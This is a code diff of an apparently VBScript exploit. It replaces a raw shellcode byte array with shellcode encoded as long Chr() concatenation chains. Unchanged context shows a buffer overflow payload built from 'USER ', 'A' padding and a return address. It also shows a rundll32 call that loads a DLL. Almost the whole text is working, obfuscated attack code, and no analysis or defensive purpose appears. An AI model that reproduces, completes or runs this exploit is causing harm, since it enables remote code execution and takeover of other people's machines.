@@ -61,42 +61,12 @@ Function s78()
     ' Offset and return address
     ret = Array(&H8F, &H35, &H4A, &H5F)
 
-    shellcode = Array(unsigned char shellcode[] = 
-"\xbe\x9c\x9f\x08\x01\xda\xde\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
-"\x78\x31\x72\x14\x03\x72\x14\x83\xea\xfc\x7e\x6a\xf4\xe9\xf7"
-"\x95\x05\xea\x67\x1f\xe0\xdb\xb5\x7b\x60\x49\x09\x0f\x24\x62"
-"\xe2\x5d\xdd\xf1\x86\x49\xd2\xb2\x2c\xac\xdd\x43\x81\x70\xb1"
-"\x80\x80\x0c\xc8\xd4\x62\x2c\x03\x29\x63\x69\x7e\xc2\x31\x22"
-"\xf4\x71\xa5\x47\x48\x4a\xc4\x87\xc6\xf2\xbe\xa2\x19\x86\x74"
-"\xac\x49\x37\x03\xe6\x71\x33\x4b\xd7\x80\x90\x88\x2b\xca\x9d"
-"\x7a\xdf\xcd\x77\xb3\x20\xfc\xb7\x1f\x1f\x30\x3a\x5e\x67\xf7"
-"\xa5\x15\x93\x0b\x5b\x2d\x60\x71\x87\xb8\x75\xd1\x4c\x1a\x5e"
-"\xe3\x81\xfc\x15\xef\x6e\x8b\x72\xec\x71\x58\x09\x08\xf9\x5f"
-"\xde\x98\xb9\x7b\xfa\xc1\x1a\xe2\x5b\xac\xcd\x1b\xbb\x08\xb1"
-"\xb9\xb7\xbb\xa6\xbb\x95\xd3\x56\xa6\x51\x24\xcf\x5f\xf3\x4a"
-"\x66\x16\xe5\xc7\x10\x64\x9d\xc1\xe7\x8b\xb4\x3f\x17\x24\x60"
-"\x17\xb0\x9c\xe6\xad\x68\x59\x50\x2e\x41\x72\xfd\x8a\x5b\x4d"
-"\x53\x7c\xf6\x4e\x05\x2f\x6e\xeb\xa4\xcf\x6e\x58\xf7\xa7\x39"
-"\xd7\x68\xf1\x39\x32\x7d\xb1\x9c\x8d\x50\x1c\x77\xed\x66\x01"
-"\x03\xbf\xd4\x13\x5d\x6d\x89\xfb\xb6\xc4\x07\xc7\xb7\x33\xde"
-"\xf1\x22\xab\xba\x95\x32\xf8\x3c\x66\xba\x1e\x56\x62\xec\xb4"
-"\xb8\x3c\x64\x3d\x81\x5e\xf2\x42\xd8\x6e\x04\xeb\xb4\xc7\xad"
-"\x45\x53\xc5\x57\x71\xd8\xea\x8d\x04\xde\x60\x6d\x4d\xd0\x0e"
-"\xd1\x51\xee\x0e\xf9\x80\x07\xbc\xfd\x22\xd8\x29\x51\xdd\x27"
-"\x56\x85\x53\xb9\xc7\xbe\xea\x54\x79\x51\x3b\x90\x4e\x9a\x74"
-"\xe9\x87\xd3\x4d\x3a\x9c\x73\xd4\x37\x35\xe8\x7a\xc1\xbf\x9f"
-"\xec\x54\x6f\x12\x91\xe1\x40\xbf\x30\x67\xf1\x10\xdf\x05\x23"
-"\x19\x7d\x99\x3b\x0e\xea\x6c\xfc\x8f\xbc\xe4\xfe\x45\x3e\xa9"
-"\x94\x9b\x54\x4b\x3e\xf4\x72\xbd\x1a\x4b\x7d\x97\x08\x65\x41"
-"\x7e\x97\x82\x42\x56\x23\xde\xc9\xe4\x8f\xd7\xe0\x34\x7b\xe4"
-"\x52\xe4\xd2\x83\x40\x90\x52\xb1\x9b\x49\xe1\xf6\x17\x5f\xb2"
-"\x73\x17\xeb\x54\x16\x97\x40\x09\x6b\xd3\x4c\xa5\x23\x88\xe4"
-"\x98\x94\x80\xae\x1d\xcf\x5f\xbc\xe6\x1b\x91\x6e\x8f\x1d\xbb"
-"\x16\x1d\x5d\x16\x72\xa2\xf6\xf0\xb2\x29\x97\x87\x4a\xf8\x02"
-"\x87\xdc\xf3\x66\x25\x4a\x0b\x5d\xc1\xe3\x0c\xa1\xee\x76\x86"
-"\x30\x74\x46\x59\xe3\x11\xd0\xfc\xfb\x31\xc1\x01\x04\x3e\x65"
-"\x97\x8f\xa8\x1f\x05\x5e\x4b\x8f\xa4\x9e";
-)
+    shellcode = Array(shellcode=Chr(187)&Chr(246)&Chr(182)&Chr(22)&Chr(190)&Chr(218)&Chr(195)&Chr(217)&Chr(116)&Chr(36)&Chr(244)&Chr(94)&Chr(43)&Chr(201)&Chr(177)&Chr(120)&Chr(49)&Chr(94)&Chr(20)&Chr(3)&Chr(94)&Chr(20)&Chr(131)&Chr(238)&Chr(252)&Chr(20)&Chr(67)&Chr(234)&Chr(86)&Chr(81)&Chr(172)&Chr(19)&Chr(167)&Chr(1)&Chr(36)&Chr(246)&Chr(150)&Chr(19)&Chr(82)&Chr(114)&Chr(138)&Chr(163)&Chr(16)&Chr(214)&Chr(39)&Chr(72)&Chr(116)&Chr(195)&Chr(188)&Chr(60)&Chr(81)&Chr(228)&Chr(117)&Chr(138)&Chr(135)&Chr(203)&Chr(134)&Chr(59)&Chr(8)&Chr(135)&Chr(69)&Chr(90)&Chr(244)&Chr(218)&Chr(153)&Chr(188)&Chr(197)&Chr(20)&Chr(236)&Chr(189)&Chr(2)&Chr(72)&Chr(31)&Chr(239)&Chr(219)&Chr(6)&Chr(178)&Chr(31)&Chr(111)&Chr(90)&Chr(15)&Chr(30)&Chr(191)&Chr(208)&Chr(47)&Chr(88)&Chr(186)&Chr(39)&Chr(219)&Chr(210)&Chr(197)&Chr(119)&Chr(116)&Chr(105)&Chr(141)&Chr(111)&Chr(254)&Chr(53)&Chr(46)&Chr(145)
+shellcode=shellcode&Chr(211)&Chr(38)&Chr(18)&Chr(216)&Chr(88)&Chr(156)&Chr(224)&Chr(219)&Chr(136)&Chr(237)&Chr(9)&Chr(234)&Chr(244)&Chr(161)&Chr(55)&Chr(194)&Chr(248)&Chr(184)&Chr(112)&Chr(229)&Chr(226)&Chr(207)&Chr(138)&Chr(21)&Chr(158)&Chr(215)&Chr(72)&Chr(103)&Chr(68)&Chr(82)&Chr(77)&Chr(207)&Chr(15)&Chr(196)&Chr(181)&Chr(241)&Chr(220)&Chr(146)&Chr(62)&Chr(253)&Chr(169)&Chr(209)&Chr(25)&Chr(226)&Chr(44)&Chr(54)&Chr(18)&Chr(30)&Chr(164)&Chr(185)&Chr(245)&Chr(150)&Chr(254)&Chr(157)&Chr(209)&Chr(243)&Chr(165)&Chr(188)&Chr(64)&Chr(94)&Chr(11)&Chr(193)&Chr(147)&Chr(6)&Chr(244)&Chr(103)&Chr(223)&Chr(165)&Chr(225)&Chr(17)&Chr(130)&Chr(161)&Chr(155)&Chr(120)&Chr(73)&Chr(50)&Chr(12)&Chr(245)&Chr(216)&Chr(92)&Chr(165)&Chr(112)&Chr(252)&Chr(245)&Chr(93)&Chr(206)&Chr(118)&Chr(208)&Chr(154)&Chr(49)&Chr(173)&Chr(45)&Chr(90)&Chr(154)&Chr(25)&Chr(25)&Chr(243)&Chr(114)&Chr(206)&Chr(159)
+shellcode=shellcode&Chr(173)&Chr(3)&Chr(169)&Chr(31)&Chr(132)&Chr(24)&Chr(214)&Chr(132)&Chr(22)&Chr(23)&Chr(72)&Chr(106)&Chr(51)&Chr(164)&Chr(58)&Chr(221)&Chr(171)&Chr(17)&Chr(189)&Chr(221)&Chr(43)&Chr(54)&Chr(238)&Chr(181)&Chr(124)&Chr(49)&Chr(145)&Chr(128)&Chr(124)&Chr(148)&Chr(69)&Chr(67)&Chr(218)&Chr(39)&Chr(72)&Chr(14)&Chr(180)&Chr(71)&Chr(94)&Chr(15)&Chr(192)&Chr(21)&Chr(204)&Chr(29)&Chr(152)&Chr(203)&Chr(160)&Chr(201)&Chr(241)&Chr(190)&Chr(110)&Chr(49)&Chr(249)&Chr(149)&Chr(230)&Chr(131)&Chr(111)&Chr(5)&Chr(162)&Chr(99)&Chr(240)&Chr(22)&Chr(84)&Chr(116)&Chr(121)&Chr(184)&Chr(62)&Chr(112)&Chr(41)&Chr(82)&Chr(160)&Chr(46)&Chr(161)&Chr(215)&Chr(152)&Chr(80)&Chr(183)&Chr(232)&Chr(240)&Chr(92)&Chr(71)&Chr(65)&Chr(172)&Chr(201)&Chr(224)&Chr(59)&Chr(58)&Chr(219)&Chr(8)&Chr(219)&Chr(193)&Chr(220)&Chr(192)&Chr(94)&Chr(245)&Chr(86)&Chr(168)&Chr(43)&Chr(249)&Chr(28)
+shellcode=shellcode&Chr(142)&Chr(171)&Chr(5)&Chr(29)&Chr(36)&Chr(122)&Chr(236)&Chr(175)&Chr(186)&Chr(124)&Chr(239)&Chr(39)&Chr(22)&Chr(131)&Chr(16)&Chr(72)&Chr(72)&Chr(9)&Chr(142)&Chr(217)&Chr(243)&Chr(148)&Chr(61)&Chr(71)&Chr(146)&Chr(81)&Chr(137)&Chr(176)&Chr(93)&Chr(170)&Chr(194)&Chr(137)&Chr(150)&Chr(227)&Chr(3)&Chr(130)&Chr(176)&Chr(110)&Chr(47)&Chr(3)&Chr(45)&Chr(28)&Chr(182)&Chr(169)&Chr(194)&Chr(178)&Chr(45)&Chr(97)&Chr(111)&Chr(43)&Chr(217)&Chr(82)&Chr(226)&Chr(202)&Chr(76)&Chr(195)&Chr(211)&Chr(97)&Chr(253)&Chr(53)&Chr(90)&Chr(27)&Chr(114)&Chr(74)&Chr(73)&Chr(176)&Chr(69)&Chr(138)&Chr(210)&Chr(22)&Chr(204)&Chr(8)&Chr(135)&Chr(148)&Chr(64)&Chr(103)&Chr(85)&Chr(242)&Chr(98)&Chr(32)&Chr(49)&Chr(216)&Chr(149)&Chr(20)&Chr(142)&Chr(35)&Chr(140)&Chr(58)&Chr(32)&Chr(27)&Chr(73)&Chr(133)&Chr(71)&Chr(152)&Chr(191)&Chr(49)&Chr(19)&Chr(19)&Chr(243)&Chr(157)
+shellcode=shellcode&Chr(148)&Chr(26)&Chr(204)&Chr(106)&Chr(167)&Chr(12)&Chr(157)&Chr(196)&Chr(192)&Chr(190)&Chr(139)&Chr(96)&Chr(242)&Chr(65)&Chr(102)&Chr(247)&Chr(51)&Chr(201)&Chr(164)&Chr(160)&Chr(54)&Chr(241)&Chr(195)&Chr(70)&Chr(83)&Chr(241)&Chr(127)&Chr(55)&Chr(46)&Chr(181)&Chr(91)&Chr(187)&Chr(96)&Chr(102)&Chr(204)&Chr(238)&Chr(215)&Chr(38)&Chr(87)&Chr(14)&Chr(2)&Chr(181)&Chr(132)&Chr(244)&Chr(70)&Chr(119)&Chr(7)&Chr(157)&Chr(94)&Chr(17)&Chr(47)&Chr(15)&Chr(160)&Chr(200)&Chr(90)&Chr(176)&Chr(9)&Chr(154)&Chr(171)&Chr(59)&Chr(218)&Chr(221)&Chr(51)&Chr(238)&Chr(79)&Chr(225)&Chr(163)&Chr(225)&Chr(37)&Chr(67)&Chr(101)&Chr(253)&Chr(147)&Chr(107)&Chr(26)&Chr(254)&Chr(227)&Chr(148)&Chr(105)&Chr(116)&Chr(114)&Chr(14)&Chr(191)&Chr(71)&Chr(164)&Chr(171)&Chr(199)&Chr(194)&Chr(184)&Chr(219)&Chr(217)&Chr(243)&Chr(70)&Chr(228)&Chr(125)&Chr(101)&Chr(205)&Chr(114)&Chr(247)&Chr(23)
+shellcode=shellcode&Chr(3)&Chr(225)&Chr(152)&Chr(186)&Chr(91)
 
     buf = "USER " & String(offset, "A") & ChrW(ret(0)) & ChrW(ret(1)) & ChrW(ret(2)) & ChrW(ret(3))
     For i = 1 To 20
@@ -140,3 +110,4 @@ result = kernel32.Create("rundll32 """ & dllPath & """,DllRegisterServer")
 End Function
 s78()
 dmn()
+
